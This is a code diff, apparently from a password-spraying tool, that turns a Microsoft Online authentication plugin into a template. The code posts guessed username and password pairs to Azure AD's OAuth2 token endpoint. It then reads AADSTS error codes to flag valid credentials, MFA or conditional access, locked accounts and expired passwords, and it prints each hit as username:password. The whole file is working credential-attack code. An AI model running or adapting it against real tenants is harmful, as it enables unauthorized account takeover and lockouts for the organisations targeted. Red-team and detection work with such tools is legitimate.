@@ -3,7 +3,12 @@ import utils.utils as utils
 requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
 
 
-def msol_authenticate(url, username, password, useragent, pluginargs):
+def extract_error(desc): # TODO: make sure this is correct for your attack
+
+    return desc.split(":")[0].strip()
+
+
+def template_authenticate(url, username, password, useragent, pluginargs): # TODO: change this to pluginname_authenticate
 
     data_response = {
         'result' : None,    # Can be "success", "failure" or "potential"
@@ -24,7 +29,7 @@ def msol_authenticate(url, username, password, useragent, pluginargs):
     client_id = random.choice(client_ids)
 
     body = {
-        'resource' : 'MSURLHERE',
+        'resource' : 'MSURLHERE', # TODO:change this
         'client_id' : client_id,
         'client_info' : '1',
         'grant_type' : 'password',
@@ -49,6 +54,8 @@ def msol_authenticate(url, username, password, useragent, pluginargs):
 
     headers = utils.add_custom_headers(pluginargs, headers)
 
+
+    # TODO: change this as needed for your attack
     try:
         resp = requests.post(f"{url}/common/oauth2/token", headers=headers, data=body)
 
@@ -60,53 +67,54 @@ def msol_authenticate(url, username, password, useragent, pluginargs):
         else:
             response = resp.json()
             error = response["error_description"]
+            error_code = extract_error(error)
 
             if "AADSTS50126" in error:
                 data_response['result'] = "failure"
-                data_response['output'] = f"[-] FAILURE: Invalid username or password. Username: {username} could exist"
+                data_response['output'] = f"[-] FAILURE ({error_code}): Invalid username or password. Username: {username} could exist"
 
             elif "AADSTS50128" in error or "AADSTS50059" in error:
                 data_response['result'] = "failure"
-                data_response['output'] = f"[-] FAILURE: Tenant for account {username} is not using AzureAD/Office365"
+                data_response['output'] = f"[-] FAILURE ({error_code}): Tenant for account {username} is not using AzureAD/Office365"
 
             elif "AADSTS50034" in error:
                 data_response['result'] = "failure"
-                data_response['output'] = f'[-] FAILURE: Tenant for account {username} is not using AzureAD/Office365'
+                data_response['output'] = f'[-] FAILURE ({error_code}): Tenant for account {username} is not using AzureAD/Office365'
 
             elif "AADSTS50076" in error:
                 # Microsoft MFA response
                 data_response['result'] = "success"
-                data_response['output'] = f"[+] SUCCESS: {username}:{password} - NOTE: The response indicates MFA (Microsoft) is in use"
+                data_response['output'] = f"[+] SUCCESS ({error_code}): {username}:{password} - NOTE: The response indicates MFA (Microsoft) is in use"
                 data_response['valid_user'] = True
 
             elif "AADSTS50079" in error:
                 # Microsoft MFA response
                 data_response['result'] = "success"
-                data_response['output'] = f"[+] SUCCESS: {username}:{password} - NOTE: The response indicates MFA (Microsoft) must be onboarded!"
+                data_response['output'] = f"[+] SUCCESS ({error_code}): {username}:{password} - NOTE: The response indicates MFA (Microsoft) must be onboarded!"
                 data_response['valid_user'] = True
 
             elif "AADSTS50158" in error:
                 # Conditional Access response (Based off of limited testing this seems to be the response to DUO MFA)
                 data_response['result'] = "success"
-                data_response['output'] = f"[+] SUCCESS: {username}:{password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use."
+                data_response['output'] = f"[+] SUCCESS ({error_code}): {username}:{password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use."
                 data_response['valid_user'] = True
 
             elif "AADSTS50053" in error:
                 # Locked out account or Smart Lockout in place
                 data_response['result'] = "potential"
-                data_response['output'] = f"[?] WARNING! The account {username} appears to be locked."
+                data_response['output'] = f"[?] WARNING ({error_code}): The account {username} appears to be locked."
 
 
             elif "AADSTS50055" in error:
                 # User password is expired
                 data_response['result'] = "success"
-                data_response['output'] = f"[+] SUCCESS: {username}:{password} - NOTE: The user's password is expired."
+                data_response['output'] = f"[+] SUCCESS ({error_code}): {username}:{password} - NOTE: The user's password is expired."
                 data_response['valid_user'] = True
 
             else:
                 # Unknown errors
                 data_response['result'] = "failure"
-                data_response['output'] = f"[-] FAILURE: Got an error we haven't seen yet for user {username}"
+                data_response['output'] = f"[-] FAILURE ({error_code}): Got an error we haven't seen yet for user {username}"
 
     except Exception as ex:
         data_response['error'] = True
